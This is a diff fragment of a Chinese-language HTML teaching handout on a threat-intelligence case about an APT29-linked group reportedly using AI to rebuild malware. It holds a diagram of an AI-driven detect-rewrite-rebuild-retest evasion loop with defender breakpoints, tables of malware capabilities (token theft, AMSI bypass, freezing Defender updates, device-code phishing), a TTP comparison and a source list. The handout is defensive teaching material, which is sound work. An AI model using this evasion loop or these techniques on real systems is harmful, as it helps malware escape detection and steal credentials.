+    B -- 否 --&gt; C[&quot;維持潛伏 / 持續收集資料&quot;]
+    C --&gt; B
+    B -- 是 --&gt; D[&quot;自動辨識被偵測的 artifact / 特徵&quot;]
+    D --&gt; E[&quot;改寫：混淆、換 loader、改 COM/CLSID、換簽章雜湊&quot;]
+    E --&gt; F[&quot;重建：winAgent build loop 重新編譯&quot;]
+    F --&gt; G[&quot;回歸測試：對 AV 測試套件自檢&quot;]
+    G --&gt; H{&quot;仍被偵測？&quot;}
+    H -- 是 --&gt; E
+    H -- 否 --&gt; I[&quot;上架拋棄式主機 → 再部署&quot;]
+    I --&gt; B
+    K1[&quot;斷點1：不給偵測回饋&lt;br/&gt;（不公布可被機器化查詢的偵測理由 / oracle）&quot;] -. 反制 .-&gt; B
+    K2[&quot;斷點2：行為/能力偵測&lt;br/&gt;（跨重編譯仍成立，不隨雜湊變）&quot;] -. 反制 .-&gt; D
+    K3[&quot;斷點3：保護更新管道&lt;br/&gt;（凍結更新偵測，讓簽章送得到）&quot;] -. 反制 .-&gt; I
+    K4[&quot;斷點4：身分層 &amp; 基礎設施&lt;br/&gt;（device code 封鎖、C2 sinkhole、拋棄式主機下架）&quot;] -. 反制 .-&gt; A
+    style B fill:#fde,stroke:#c33
+    style H fill:#fde,stroke:#c33
+    style I fill:#dfe,stroke:#3a3
+    style K1 fill:#eef,stroke:#33c
+    style K2 fill:#eef,stroke:#33c
+    style K3 fill:#eef,stroke:#33c
+    style K4 fill:#eef,stroke:#33c
+</pre>
+<h3 id="d3">D.3 防守方如何打斷閉環（四個斷點的工程解釋）</h3>
+<ol>
+<li><strong>斷點 1 — 不餵養偵測 oracle</strong>：閉環的燃料是「明確的被偵測/未被偵測訊號」。若防守方把偵測邏輯做成攻擊者<strong>無法低成本、可機器化查詢</strong>的形態（例如以雲端行為分析取代本機靜態簽章、延遲揭露、對外不回傳精確判定理由），就抽走了迴圈的回饋訊號。這也是第 10.2 討論題 5「公開 IOC 是否反而餵養 AI 迴圈」的核心。</li>
+<li><strong>斷點 2 — 偵測「功能」而非「長相」</strong>：閉環改的是<strong>簽章與外觀</strong>，改不掉<strong>功能與行為</strong>（竊 <code>.tbres</code>、凍結 Defender、假更新命名 + version.dll 側載、companion device 連結）。以行為家族/能力偵測（對映第 5、7.5 節），讓「重編譯」白費工。</li>
+<li><strong>斷點 3 — 保護補給線</strong>：閉環假設「新變種上架後，受害端的舊簽章擋不住」；但若受害端更新管道健康（附錄 C），至少行為簽章與雲端偵測仍可到位，壓縮「隱形視窗」。</li>
+<li><strong>斷點 4 — 攻在迴圈之外</strong>：閉環規避的是<strong>端點靜態偵測</strong>，繞不開<strong>身分層</strong>（device code 濫用被 Conditional Access 擋下，token 迴圈就斷）與<strong>基礎設施</strong>（拋棄式主機、C2 面板、VPS 被下架/sinkhole，改寫得再快也沒有散佈點）。這說明<strong>縱深防禦</strong>為何是對閉環最務實的解——不是贏在「比 AI 改得快」，而是贏在「AI 改不到的層面」。</li>
+</ol>
+<hr />
+<h2 id="e-pass-websearch">附錄 E — 第三方技術對照補搜（本 pass 以新 WebSearch 配額補齊第一階段缺口）</h2>
+<blockquote>
+<p>補上文第 12 節第 6 點「WebSearch 額度已用罄」所缺的三項：CaptiveCrunch 完整技術要點、PowerChrome/CloudSyncSvc/WUEngine 第三方對應現況、APT29/Midnight Blizzard 既有 TTP 對照。<strong>方法論紅線不變：以 PDF 原文為準，第三方僅作交叉佐證，未連線任何 IOC。</strong></p>
+</blockquote>
+<h3 id="e1-microsoft-captivecrunchstorm-2945">E.1 Microsoft CaptiveCrunch（Storm-2945）完整技術報告要點</h3>
+<table>
+<thead>
+<tr>
+<th>面向</th>
+<th>技術細節（第三方獨立揭露）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>歸因/時間</td>
+<td>Microsoft 歸 <strong>Storm-2945</strong>（Midnight Blizzard 子群集，美英歸因 SVR）；活動至少自 <strong>2026-05</strong> 起</td>
+</tr>
+<tr>
+<td>DNS 劫持機制</td>
+<td>受害飯店的 <strong>captive portal gateway 同時是 DNS resolver</strong>；攻擊者取得管理權後<strong>偽造 DNS 回應</strong>導流，其餘網域正常轉發以維持隱蔽</td>
+</tr>
+<tr>
+<td>投放需使用者執行</td>
+<td>gateway 只負責導向，<strong>不靜默感染</strong>；落地需 <strong>ClickFix</strong> 誘使使用者自行執行攻擊者提供的指令</td>
+</tr>
+<tr>
+<td>CornFlake（＝CloudSyncSvc）</td>
+<td>Go RAT，落 <code>%APPDATA%\svchost32\svchost32.exe</code>，服務顯示名 "Cloud Sync Service"；閒置截圖、剪貼簿+視窗標題側錄、瀏覽器 cookie/密碼（含 Chrome ABE）竊取、可移除媒體掃描、遠端 shell；Run keys + 排程 + <strong>watchdog 復原持久化</strong></td>
+</tr>
+<tr>
+<td>ChocoShell（＝CHERRYPIE）</td>
+<td>記憶體型 PowerShell 竊取器；竊 M365/AAD access+refresh token 與 <strong>WAM <code>.tbres</code> token</strong> 供工作階段重放；AMSI 繞過、UAC 繞過、<strong>鎖 Defender 簽章更新</strong></td>
+</tr>
+<tr>
+<td>FruitStone</td>
+<td>web C2 面板，<strong>單頁 HTML/JS、所有功能無驗證</strong> → 面板本身暴露於公網，可被外部指紋</td>
+</tr>
+<tr>
+<td>device code</td>
+<td>自 <strong>2026-07-16</strong> 起，誘餌頁把使用者導向 Microsoft <strong>device code 認證流程</strong>，於輸碼當下取得 MFA 已滿足的存取</td>
+</tr>
+<tr>
+<td>Microsoft 防禦建議</td>
+<td>①Conditional Access <strong>封鎖非必要 device code flow</strong>；②出差裝置用<strong>全通道 VPN</strong>，讓 DNS 在連上場館 gateway 前先走公司 resolver</td>
+</tr>
+<tr>
+<td>多廠佐證</td>
+<td><strong>ReliaQuest（2026-07-23 最先揭露）</strong>、<strong>Microsoft（2026-07-31）</strong>、<strong>Zscaler（2026-08-11，多為轉述）</strong>、<strong>Google GTIG</strong>、<strong>Lumen Black Lotus Labs</strong> 均有記載</td>
+</tr>
+</tbody>
+</table>
+<p>（以上與上文第 9.1 一致並補足了 CornFlake 落地路徑、watchdog、ChocoShell 竊 <code>.tbres</code>、FruitStone 無驗證、device code 起始日期等更細的協定/實作點。）</p>
+<h3 id="e2-powerchrome-cloudsyncsvc-wuengine">E.2 PowerChrome / CloudSyncSvc / WUEngine 的第三方對應現況（補搜結論）</h3>
+<table>
+<thead>
+<tr>
+<th>家族名</th>
+<th>第三方對應</th>
+<th>補搜結論</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>CloudSyncSvc</strong></td>
+<td>Microsoft <strong>CornFlake</strong>（服務名 "Cloud Sync Service"）</td>
+<td><strong>已對齊</strong>（強）。細節見 E.1</td>
+</tr>
+<tr>
+<td><strong>PowerChrome</strong></td>
+<td>無</td>
+<td>補搜仍<strong>無獨立技術分析</strong>；各家報導（The Hacker News、Unite.AI 等）僅<strong>照抄 Anthropic 的家族名清單</strong>，未見任何一手逆向。維持「單一來源」判定</td>
+</tr>
+<tr>
+<td><strong>WUEngine</strong></td>
+<td>無</td>
+<td>同上，僅見於 Anthropic IOC/清單；第三方無對應樣本分析。維持「單一來源」判定</td>
+</tr>
+<tr>
+<td>MiniPlasma</td>
+<td>公開 LPE PoC 同名</td>
+<td><strong>關聯未證實</strong>，見第 9.4、第 12 節與附錄 B.6</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>教學結論：即便動用新配額，<strong>PowerChrome 與 WUEngine 至今仍是 Anthropic 單一來源命名</strong>——這本身是重要的情報素材：說明「AI 供應商能看到攻擊者在建構的工具，但這些工具未必進入傳統端點/網路廠商的樣本庫」，正對映第 2.3、8.2 的可見度邊界論。</p>
+</blockquote>
+<h3 id="e3-apt29-midnight-blizzard-ttp">E.3 APT29 / Midnight Blizzard 既有 TTP 對照（歷史 → 本案的演化）</h3>
+<p>把本案放進 APT29（Cozy Bear / SVR，MITRE <strong>G0016</strong>）二十年 tradecraft 的脈絡，可見<strong>主題不變、手段隨技術演化</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>APT29 既有 TTP（歷史）</th>
+<th>代表事件 / 工具</th>
+<th>GTG-20006 的對應與演化</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>供應鏈 build 過程植入</td>
+<td><strong>SolarWinds SUNBURST</strong>（2020），TEARDROP、GoldMax/GoldFinder/Sibot</td>
+<td>本案不植供應鏈，改為<strong>竊供應鏈情報</strong>（無人機 SDK/BOM/供應商依賴/未發表產品逆向）——同「戰略供應鏈」母題，手段從「植入」轉「竊密 + AI 加值」</td>
+</tr>
+<tr>
+<td>AD FS token 簽章竊取 / Golden SAML</td>
+<td><strong>FoggyWeb、MagicWeb</strong></td>
+<td>本案改走<strong>雲原生身分濫用</strong>：device code → PRT → 攻擊者裝置註冊（附錄 A.2），達到類似「偽造合法登入」效果，但不需碰 on-prem AD FS</td>
+</tr>
+<tr>
+<td>惡意 M365 OAuth 應用 / 雲信箱長期潛伏</td>
+<td>「讀信數月、悄然離開」</td>
+<td>本案 <strong>Embassy Kit</strong>：device code 大量取 token、bulk mailbox export、<strong>自動 token refresh 排程</strong>（附錄 A.2.3）——把「長期潛伏」自動化</td>
+</tr>
+<tr>
+<td>device code phishing</td>
+<td><strong>Storm-2372</strong>（2024–25，Auth Broker client id 取 PRT）</td>
+<td>本案把該手法<strong>框架化（Embassy Kit）並以 AI 自動生成高度個人化誘餌</strong>；OAuth device code 釣魚在 2026 出現數十倍增長（Cloud Security Alliance 研究）為此背景</td>
+</tr>
+<tr>
+<td>外交/智庫 spear-phishing</td>
+<td><strong>WINELOADER、GRAPELOADER、ROOTSAW</strong></td>
+<td>本案 <code>chathamhouse[.]eu</code>、<code>ukrinform-share[.]net</code>、<code>chamber-ua[.]org</code> 等仿冒誘餌，主題一致（外交、智庫、烏克蘭機構）</td>
+</tr>
+<tr>
+<td>研究/IP 竊取</td>
+<td><strong>WellMess / WellMail</strong>（2020 疫苗研究）</td>
+<td>本案國防與無人機 IP 竊取——同「竊取戰略技術情報」母題</td>
+</tr>
+<tr>
+<td>regionally appropriate proxy 隱身</td>
+<td>歷來慣用住宅/在地代理</td>
+<td>本案 <strong>eclipse proxies</strong>、Storm-2372 亦用「地理相稱代理」隱藏可疑登入——一脈相承</td>
+</tr>
+<tr>
+<td>長期、隱蔽、以情報為目的（非破壞）</td>
+<td>APT29 一貫風格</td>
+<td>本案 GHOSTBLADE <strong>完成外洩即自清退出、最小化留存</strong>，符合 APT29「潛伏取情、不留痕」傳統</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>教學價值：這張表讓學員看見<strong>「同一行為者的 DNA 不在工具，而在目標選擇與作業哲學」</strong>。工具會隨技術（AI、雲身分）演化，但 SVR 的情報需求（外交、國防、供應鏈、烏克蘭）與「隱蔽長潛」風格穩定——這正是<strong>行為歸因（第 2.1、2.2 節）</strong>比 IOC 歸因耐用的原因，也呼應第 9.4「靠雜湊與 TTP 拼圖、而非代號」。</p>
+</blockquote>
+<h3 id="e4-pass-ioc">E.4 本 pass 補搜來源（皆為公開報導/廠商部落格，未連線任何 IOC）</h3>
+<ul>
+<li><a href="https://thehackernews.com/2026/08/hijacked-hotel-wi-fi-pushes-fake.html">Microsoft/CaptiveCrunch 技術要點（The Hacker News, 2026-08）</a></li>
+<li><a href="https://www.helpnetsecurity.com/2026/08/04/midnight-blizzard-hotel-wi-fi-networks-hacking/">Help Net Security — Midnight Blizzard hotel Wi-Fi（2026-08-04）</a></li>
+<li><a href="https://thehackernews.com/2026/09/russian-state-sponsored-hackers-use.html">The Hacker News — Russian hackers use Claude to rebuild malware（2026-09）</a></li>
+<li><a href="https://www.anthropic.com/threat-intelligence-report-september-2026">Anthropic — Countering misuse of AI: September 2026（官方）</a></li>
+<li><a href="https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2372-conducts-device-code-phishing-campaign/">Microsoft Security Blog — Storm-2372 device code phishing（2025-02-13）</a></li>
+<li><a href="https://www.securityweek.com/russian-state-hackers-target-organizations-with-device-code-phishing/">SecurityWeek — Russian state hackers device code phishing</a></li>
+<li><a href="https://labs.cloudsecurityalliance.org/research/csa-research-note-oauth-device-code-phishing-surge-20260405/">Cloud Security Alliance — OAuth Device Code Phishing 37x surge</a></li>
+<li><a href="https://www.helpnetsecurity.com/2026/03/19/darksword-ios-exploit-iphone/">Google GTIG / Help Net Security — DarkSword iOS exploit（2026-03-19）</a></li>
+<li><a href="https://thehackernews.com/2026/03/darksword-ios-exploit-kit-uses-6-flaws.html">The Hacker News — DarkSword 6 flaws 3 zero-days（2026-03）</a></li>
+<li><a href="https://thehackernews.com/2026/08/chinese-threat-actor-uses-leaked.html">The Hacker News — Chinese actor reuses leaked DarkSword kit（2026-08）</a></li>
+<li><a href="https://research.splunk.com/endpoint/d81d4d3d-76b5-4f21-ab51-b17d5164c106/">Splunk Security Content — FakeCAPTCHA Clipboard Execution（ClickFix 偵測）</a></li>
+<li><a href="https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_susp_clickfix_filefix_execution/">Detection.FYI / SigmaHQ — ClickFix/FileFix Execution 規則</a></li>
+<li><a href="https://www.gendigital.com/blog/insights/research/ghostpairing-whatsapp-attack">GenDigital — GhostPairing WhatsApp device-linking 攻擊</a></li>
+<li><a href="https://www.bleepingcomputer.com/news/security/whatsapp-device-linking-abused-in-account-hijacking-attacks/">BleepingComputer — WhatsApp device linking abused</a></li>
+<li><a href="https://thehackernews.com/2026/09/fake-software-installers-disable.html">The Hacker News — Fake installers disable Windows Update &amp; weaken Defender（2026-09）</a></li>
+<li><a href="https://github.com/splunk/security_content/blob/develop/detections/endpoint/windows_impair_defense_disable_realtime_signature_delivery.yml">Splunk — Disable Realtime Signature Delivery 偵測</a></li>
+<li><a href="https://attack.mitre.org/groups/G0016/">MITRE ATT&amp;CK — APT29 (G0016)</a></li>
+<li><a href="https://www.picussecurity.com/resource/blog/apt29-cozy-bear-evolution-techniques">Picus Security — APT29 evolution &amp; techniques</a></li>
+</ul>
+<hr />
+<h2 id="f-p511-p40">附錄 F — 圖表完整性確認（p.5–11 + p.40）</h2>
+<p>依第二階段規則，最後確認本案頁段每一張視覺素材都有完整解說（圖片類型、圖上文字、資料流、核心訊息、課堂用法）：</p>
+<table>
+<thead>
+<tr>
+<th>頁</th>
+<th>視覺素材</th>
+<th>上文解說位置</th>
+<th>狀態</th>
+<th>本 pass 補強</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>p.7</strong></td>
+<td>GTG-20006｜Midnight Blizzard 行動儀表板（四縱欄 A/B/C/D + 頁首頁尾）</td>
+<td><strong>第 6.1 節</strong>（逐欄逐格判讀 W1–W8、inferred 命中比、Operations map、Tasks 時間戳、頁尾統計條）</td>
+<td><strong>完整</strong></td>
+<td>附錄 A.2.3 補「W3/W5 ＝ Embassy Kit 後端架構」的技術對映；附錄 D 補「W8 Evasion testing ＝ 閉環的偵測測試節點」</td>
+</tr>
+<tr>
+<td><strong>p.10</strong></td>
+<td>惡意程式清單頁（Windows/Android/iOS 三清單 + IOC 框上半）</td>
+<td><strong>第 6.2 節</strong></td>
+<td><strong>完整</strong></td>
+<td>附錄 B 對七個家族逐一補功能/持久化/C2 + 偵測規則</td>
+</tr>
+<tr>
+<td><strong>p.11</strong></td>
+<td>IOC 續頁（網域/IP/email/檔名/2×SHA-256，下半轉入 GTG-50014）</td>
+<td><strong>第 6.3 節</strong> + 第 7 節完整抄錄</td>
+<td><strong>完整</strong></td>
+<td>附錄 B.1/B.2 補雜湊對應的家族技術（CornFlake/ChocoShell）</td>
+</tr>
+<tr>
+<td><strong>p.40</strong></td>
+<td>Figure 19「Skill breakdown」三欄表（8 列 persona/ATT&amp;CK/flow）</td>
+<td><strong>第 6.4 節</strong></td>
+<td><strong>完整</strong></td>
+<td>附錄 A/B/C 多處回指技能表（winAgent build loop、shadow_c2、iOS persona 等）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>結論</strong>：本案頁段（p.5–11）<strong>無圖表遺漏</strong>；p.7 儀表板與 p.10–11 惡意程式/IOC 表在第 6 節已逐一完整判讀，本技術深化 pass 在附錄 A–D 補上這些圖表元素背後的<strong>協定級/命令級技術機制</strong>，形成「圖上看到什麼（第 6 節）↔ 技術上怎麼運作與怎麼偵測（附錄 A–D）」的雙層對照。</p>
+<blockquote>
+<p>備註：p.7 儀表板為 Anthropic 製作之<strong>風格化戰役回顧視覺化</strong>，非真實工具截圖；其數字（148 agents、24/27、55 capabilities、130 days）屬單一來源內部彙整（見第 12 節第 8 點），引用時務必標明。</p>
+</blockquote>
+<hr />
+<p><em>（教材完）</em></p>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js"></script>
+<script>
+(function(){
+  var dark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+  if (window.mermaid) {
+    mermaid.initialize({startOnLoad:true, theme: dark ? 'dark' : 'default', securityLevel:'loose', flowchart:{useMaxWidth:true}});
+  }
+})();
+</script>
+</body></html>
